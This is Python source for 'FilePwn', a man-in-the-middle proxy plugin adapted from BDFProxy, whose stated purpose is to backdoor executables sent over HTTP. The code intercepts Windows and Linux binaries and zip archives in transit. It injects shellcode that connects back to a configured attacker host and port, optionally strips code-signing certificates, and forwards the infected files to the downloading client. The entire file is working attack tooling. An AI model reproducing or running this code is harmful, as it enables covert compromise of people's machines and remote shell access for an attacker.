################################################################################################
# 99.9999999% of this code is stolen from BDFProxy - https://github.com/secretsquirrel/BDFProxy
#################################################################################################

import sys
import os
import pefile
import zipfile
import logging
import shutil
import random
import string
from libs.bdfactory import pebin, elfbin
from plugins.plugin import Plugin
from tempfile import mkstemp

try:
    from configobj import ConfigObj
except:
    sys.exit('[-] configobj library not installed!')


class FilePwn(Plugin):
    name = "FilePwn"
    optname = "filepwn"
    implements = ["handleResponse"]
    has_opts = True
    desc = "Backdoor executables being sent over http using bdfactory"

    def convert_to_Bool(self, aString):
        if aString.lower() == 'true':
            return True
        elif aString.lower() == 'false':
            return False
        elif aString.lower() == 'none':
            return None

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.filepwncfg = options.filepwncfg or "./config/filepwn.cfg"

        self.binaryMimeTypes = ["application/octet-stream", 'application/x-msdownload',
                                'application/x-msdos-program', 'binary/octet-stream']

        self.zipMimeTypes = ['application/x-zip-compressed', 'application/zip']

        #NOT USED NOW
        #self.supportedBins = ('MZ', '7f454c46'.decode('hex'))

        self.userConfig = ConfigObj(self.filepwncfg)
        self.FileSizeMax = self.userConfig['targets']['ALL']['FileSizeMax']
        self.WindowsIntelx86 = self.userConfig['targets']['ALL']['WindowsIntelx86']
        self.WindowsIntelx64 = self.userConfig['targets']['ALL']['WindowsIntelx64']
        self.WindowsType = self.userConfig['targets']['ALL']['WindowsType']
        self.LinuxIntelx86 = self.userConfig['targets']['ALL']['LinuxIntelx86']
        self.LinuxIntelx64 = self.userConfig['targets']['ALL']['LinuxIntelx64']
        self.LinuxType = self.userConfig['targets']['ALL']['LinuxType']
        self.zipblacklist = self.userConfig['ZIP']['blacklist']

        print "[*] FilePwn plugin online"

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """

        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                #update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                        add_section = False
                        cave_jumping = False
                        if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx64['SHELL'],
                                                 HOST=self.WindowsIntelx64['HOST'],
                                                 PORT=int(self.WindowsIntelx64['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
                                                 )

                        result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                        add_section = False
                        cave_jumping = False
                        #add_section wins for cave_jumping
                        #default is single for BDF
                        if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx86['SHELL'],
                                                 HOST=self.WindowsIntelx86['HOST'],
                                                 PORT=int(self.WindowsIntelx86['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.convert_to_Bool(self.WindowsIntelx86['SUPPLIED_SHELLCODE']),
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT'])
                                                 )

                        result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=True)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    #x86
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.convert_to_Bool(self.LinuxIntelx86['SUPPLIED_SHELLCODE']),
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    #x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.convert_to_Bool(self.LinuxIntelx64['SUPPLIED_SHELLCODE']),
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
            return None

    def zipGrinder(self, aZipFile):
        "When called will unpack and edit a Zip File and return a zip file"

        logging.info("ZipFile size: %s KB" % (len(aZipFile) / 1024))

        if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
            logging.info("ZipFIle maxSize met %s" % len(aZipFile))
            return aZipFile

        tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
        tmpDir = '/tmp/' + tmpRan
        tmpFile = '/tmp/' + tmpRan + '.zip'

        os.mkdir(tmpDir)

        with open(tmpFile, 'w') as f:
            f.write(aZipFile)

        zippyfile = zipfile.ZipFile(tmpFile, 'r')

        #encryption test
        try:
            zippyfile.testzip()

        except RuntimeError as e:
            if 'encrypted' in str(e):
                logging.info('Encrypted zipfile found. Not patching.')
                return aZipFile

        logging.info("ZipFile contents and info:")

        for info in zippyfile.infolist():
            logging.info("\t%s %s %s" % (info.filename, info.date_time, info.file_size))

        zippyfile.extractall(tmpDir)

        patchCount = 0

        for info in zippyfile.infolist():
            logging.info(">>> Next file in zipfile: %s" % info.filename)

            if os.path.isdir(tmpDir + '/' + info.filename) is True:
                logging.info('%s is a directory' % info.filename)
                continue
            #Check against keywords
            keywordCheck = False

            if type(self.zipblacklist) is str:
                if self.zipblacklist.lower() in info.filename.lower():
                    keywordCheck = True

            else:
                for keyword in self.zipblacklist:
                    if keyword.lower() in info.filename.lower():
                        keywordCheck = True
                        continue

            if keywordCheck is True:
                logging.info('Zip blacklist enforced on %s' % info.filename)
                continue

            patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)

            if patchResult:
                patchCount += 1
                file2 = "backdoored/" + os.path.basename(info.filename)
                shutil.copyfile(file2, tmpDir + '/' + info.filename)
                logging.info("%s in zip patched, adding to zipfile" % info.filename)

            else:
                logging.info("%s patching failed. Keeping original file in zip." % info.filename)


            if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
                logging.info("Met Zip config patchCount limit.")
                break

        zippyfile.close()

        zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)

        logging.debug("Writing to zipfile: %s" % tmpFile)

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                    filename = os.path.join(base, afile)
                    logging.debug('[*] Writing filename to zipfile: %s' % filename.replace(tmpDir + '/', ''))
                    zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zipResult.close()
        #clean up
        shutil.rmtree(tmpDir)

        with open(tmpFile, 'rb') as f:
            aZipFile = f.read()
        os.remove(tmpFile)

        return aZipFile

    def handleResponse(self, request, data):

        content_header = request.client.headers['Content-Type']

        if content_header in self.zipMimeTypes:
            logging.info("%s Detected supported zip file type!" % request.client.getClientIP())
            bd_zip = self.zipGrinder(data)
            if bd_zip:
                logging.info("%s Patching complete, forwarding to client" % request.client.getClientIP())
                return {'request': request, 'data': bd_zip}

        elif content_header in self.binaryMimeTypes:
            logging.info("%s Detected supported binary type!" % request.client.getClientIP())   
            fd, tmpFile = mkstemp()
            with open(tmpFile, 'w') as f:
                f.write(data)

            patchb = self.binaryGrinder(tmpFile)

            if patchb:
                bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                os.remove('./backdoored/' + os.path.basename(tmpFile))
                logging.info("%s Patching complete, forwarding to client" % request.client.getClientIP())
                return {'request': request, 'data': bd_binary}

        else:
            logging.debug("%s File is not of supported Content-Type: %s" % (request.client.getClientIP(), content_header))
            return {'request': request, 'data': data}

    def add_options(self, options):
        options.add_argument("--filepwncfg", type=file, help="Specify a config file [default: filepwn.cfg]")
